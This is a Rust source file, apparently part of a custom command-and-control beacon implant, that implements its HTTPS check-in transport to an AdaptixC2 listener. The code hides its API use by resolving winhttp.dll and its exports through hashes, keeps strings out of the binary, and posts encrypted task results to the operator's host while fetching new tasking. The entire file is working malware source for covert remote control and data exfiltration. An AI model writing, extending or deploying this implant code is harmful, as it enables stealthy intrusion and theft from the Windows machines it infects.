//! WinHTTP transport (phase 3): one POST transaction per check-in cycle
//! against the AdaptixC2 `BeaconHTTP` listener.
//!
//! No import table, as everywhere: `winhttp.dll` is loaded on demand through
//! `LoadLibraryA` (kernel32, hash-resolved — the module name is a declared
//! runtime literal in the anti-strings manifest) and every export is
//! resolved by FNV-64 hash. The byte shaping of the transaction (beat
//! envelope, page template, task pack) is pure and lives in
//! `specter_core::transport`, pinned there against the server source; this
//! module only carries the bytes.
//!
//! One transaction = open session, connect, request, send, read, close
//! everything. Any failure is non-fatal: the cycle just sleeps and retries
//! (the listener is unreachable for minutes at a time in the field).

use core::ffi::c_void;

use specter_core::fnv::{fnv1a64, fnv1a64_wide_ascii_ci};
use specter_core::peb::{self, Peb};

/// Runtime literal (declared in the anti-strings manifest): the module is
/// usually NOT in the PEB when the beacon starts.
const WINHTTP_DLL: &[u8] = b"winhttp.dll\0";

const H_WINHTTP: u64 = fnv1a64_wide_ascii_ci("winhttp.dll");
const H_LOAD_LIBRARY_A: u64 = fnv1a64(b"LoadLibraryA");

const H_OPEN: u64 = fnv1a64(b"WinHttpOpen");
const H_CONNECT: u64 = fnv1a64(b"WinHttpConnect");
const H_OPEN_REQUEST: u64 = fnv1a64(b"WinHttpOpenRequest");
const H_ADD_REQUEST_HEADERS: u64 = fnv1a64(b"WinHttpAddRequestHeaders");
const H_SEND_REQUEST: u64 = fnv1a64(b"WinHttpSendRequest");
const H_RECEIVE_RESPONSE: u64 = fnv1a64(b"WinHttpReceiveResponse");
const H_QUERY_DATA_AVAILABLE: u64 = fnv1a64(b"WinHttpQueryDataAvailable");
const H_READ_DATA: u64 = fnv1a64(b"WinHttpReadData");
const H_CLOSE_HANDLE: u64 = fnv1a64(b"WinHttpCloseHandle");

/// `WINHTTP_ACCESS_TYPE_DEFAULT_PROXY`, `WINHTTP_ADDREQ_FLAG_ADD`,
/// `WINHTTP_FLAG_SECURE` (HTTPS listeners, decided by port).
const ACCESS_DEFAULT_PROXY: u32 = 0;
const ADDREQ_ADD: u32 = 0x2000_0000;
const FLAG_SECURE: u32 = 0x0080_0000;

/// The resolved WinHTTP surface. Raw `system`-ABI signatures (win64).
#[derive(Clone, Copy)]
pub struct WinHttp {
    pub open:
        unsafe extern "system" fn(*const u16, u32, *const c_void, *const u16, u32) -> *mut c_void,
    pub connect: unsafe extern "system" fn(*mut c_void, *const u16, u16, u32) -> *mut c_void,
    #[allow(clippy::type_complexity)]
    pub open_request: unsafe extern "system" fn(
        *mut c_void,
        *const u16,
        *const u16,
        *const u16,
        *const u16,
        *const *const u16,
        u32,
    ) -> *mut c_void,
    pub add_request_headers: unsafe extern "system" fn(*mut c_void, *const u16, u32, u32) -> i32,
    #[allow(clippy::type_complexity)]
    pub send_request:
        unsafe extern "system" fn(*mut c_void, *const u16, u32, *const u8, u32, u32, usize) -> i32,
    pub receive_response: unsafe extern "system" fn(*mut c_void, *const c_void) -> i32,
    pub query_available: unsafe extern "system" fn(*mut c_void, *mut u32) -> i32,
    pub read_data: unsafe extern "system" fn(*mut c_void, *mut u8, u32, *mut u32) -> i32,
    pub close: unsafe extern "system" fn(*mut c_void) -> i32,
}

/// Resolve winhttp.dll: PEB first, `LoadLibraryA` if absent. `None` disables
/// the transport for the whole run (the beacon keeps sleeping — a networkless
/// run stays silent rather than fatal).
///
/// # Safety
///
/// Beacon thread after bootstrap; PEB and kernel32 valid.
pub unsafe fn resolve(peb: *mut Peb, kernel32: *mut c_void) -> Option<WinHttp> {
    let mut module = peb::find_module(peb, H_WINHTTP);
    if module.is_null() && !kernel32.is_null() {
        let load = peb::find_export(kernel32, H_LOAD_LIBRARY_A);
        if !load.is_null() {
            let load = *(load as *const unsafe extern "system" fn(*const u8) -> *mut c_void);
            module = load(WINHTTP_DLL.as_ptr());
        }
    }
    if module.is_null() {
        return None;
    }
    let export = |h: u64| peb::find_export(module, h);
    let ptr = export(H_OPEN);
    if ptr.is_null() {
        return None;
    }
    Some(WinHttp {
        open: *(ptr as *const _),
        connect: *(export(H_CONNECT) as *const _),
        open_request: *(export(H_OPEN_REQUEST) as *const _),
        add_request_headers: *(export(H_ADD_REQUEST_HEADERS) as *const _),
        send_request: *(export(H_SEND_REQUEST) as *const _),
        receive_response: *(export(H_RECEIVE_RESPONSE) as *const _),
        query_available: *(export(H_QUERY_DATA_AVAILABLE) as *const _),
        read_data: *(export(H_READ_DATA) as *const _),
        close: *(export(H_CLOSE_HANDLE) as *const _),
    })
}

/// One request against the listener (ASCII config strings are widened here;
/// the blob carries no UTF-16 constants).
pub struct Request<'a> {
    /// `host[:port]` — the port defaults to 443 when absent (HTTPS).
    pub host: &'a [u8],
    pub port: u16,
    /// URI path (`/...`), rotated by the caller.
    pub path: &'a [u8],
    pub user_agent: &'a [u8],
    /// Header lines, ASCII, each terminated by `\r\n`.
    pub headers: &'a [u8],
    /// RC4(session) framed results; empty on the check-in beat.
    pub body: &'a [u8],
}

/// ASCII bytes to NUL-terminated UTF-16 in `buf`. Returns `None` if it does
/// not fit. ASCII-only: every config string is validated ASCII at build
/// time (the manifest would catch a stray high byte).
fn wide(s: &[u8], buf: &mut [u16]) -> Option<usize> {
    if s.len() + 1 > buf.len() {
        return None;
    }
    let mut i = 0;
    while i < s.len() {
        buf[i] = s[i] as u16;
        i += 1;
    }
    buf[s.len()] = 0;
    Some(s.len())
}

/// The request's UTF-16 side: built once per transaction, read-only after.
struct WideRequest {
    ua: [u16; 256],
    host: [u16; 256],
    path: [u16; 512],
    verb: [u16; 4],
    headers: [u16; 2048],
}

/// Full POST transaction; response bytes land in `resp` (truncated on
/// overflow — the task budget of the MVP). `None` = transport failure; the
/// handles of the failed attempt are all closed.
///
/// # Safety
///
/// Beacon thread; `wh` resolved through `resolve` on this run.
pub unsafe fn post(wh: &WinHttp, req: &Request, resp: &mut [u8]) -> Option<usize> {
    let mut w = WideRequest {
        ua: [0; 256],
        host: [0; 256],
        path: [0; 512],
        verb: [0; 4],
        headers: [0; 2048],
    };

    wide(req.user_agent, &mut w.ua)?;
    wide(req.host, &mut w.host)?;
    wide(req.path, &mut w.path)?;
    wide(b"POST", &mut w.verb)?;
    wide(req.headers, &mut w.headers)?;

    let session = (wh.open)(
        w.ua.as_ptr(),
        ACCESS_DEFAULT_PROXY,
        core::ptr::null(),
        core::ptr::null(),
        0,
    );
    if session.is_null() {
        return None;
    }
    let out = transaction_on_session(wh, session, req, &w, resp);
    (wh.close)(session);
    out
}

unsafe fn transaction_on_session(
    wh: &WinHttp,
    session: *mut c_void,
    req: &Request,
    w: &WideRequest,
    resp: &mut [u8],
) -> Option<usize> {
    let conn = (wh.connect)(session, w.host.as_ptr(), req.port, 0);
    if conn.is_null() {
        return None;
    }
    let out = transaction_on_conn(wh, conn, req, w, resp);
    (wh.close)(conn);
    out
}

unsafe fn transaction_on_conn(
    wh: &WinHttp,
    conn: *mut c_void,
    req: &Request,
    w: &WideRequest,
    resp: &mut [u8],
) -> Option<usize> {
    // HTTPS only on the default TLS port: the listeners we target are plain
    // HTTP in the lab, HTTPS in the field.
    let flags = if req.port == 443 { FLAG_SECURE } else { 0 };
    let request = (wh.open_request)(
        conn,
        w.verb.as_ptr(),
        w.path.as_ptr(),
        core::ptr::null(),
        core::ptr::null(),
        core::ptr::null(),
        flags,
    );
    if request.is_null() {
        return None;
    }
    let out = transaction_on_request(wh, request, w, req, resp);
    (wh.close)(request);
    out
}

unsafe fn transaction_on_request(
    wh: &WinHttp,
    request: *mut c_void,
    w: &WideRequest,
    req: &Request,
    resp: &mut [u8],
) -> Option<usize> {
    if (wh.add_request_headers)(request, w.headers.as_ptr(), 0xFFFF_FFFF, ADDREQ_ADD) == 0 {
        return None;
    }
    let body_ptr = if req.body.is_empty() {
        core::ptr::null()
    } else {
        req.body.as_ptr()
    };
    let body_len = req.body.len() as u32;
    if (wh.send_request)(
        request,
        core::ptr::null(),
        0,
        body_ptr,
        body_len,
        body_len,
        0,
    ) == 0
    {
        return None;
    }
    if (wh.receive_response)(request, core::ptr::null()) == 0 {
        return None;
    }

    // Read until EOF or buffer full (a bigger page overflows silently: the
    // payload template sits at both ends of the page, so truncation loses
    // the append marker and the cycle treats it as a foreign page).
    let mut off = 0usize;
    let mut avail: u32 = 0;
    loop {
        if (wh.query_available)(request, &mut avail) == 0 {
            return None;
        }
        if avail == 0 {
            break;
        }
        let want = (avail as usize).min(resp.len() - off);
        let mut got: u32 = 0;
        if (wh.read_data)(request, resp.as_mut_ptr().add(off), want as u32, &mut got) == 0 {
            return None;
        }
        if got == 0 {
            break;
        }
        off += got as usize;
        if off == resp.len() {
            break;
        }
    }
    Some(off)
}
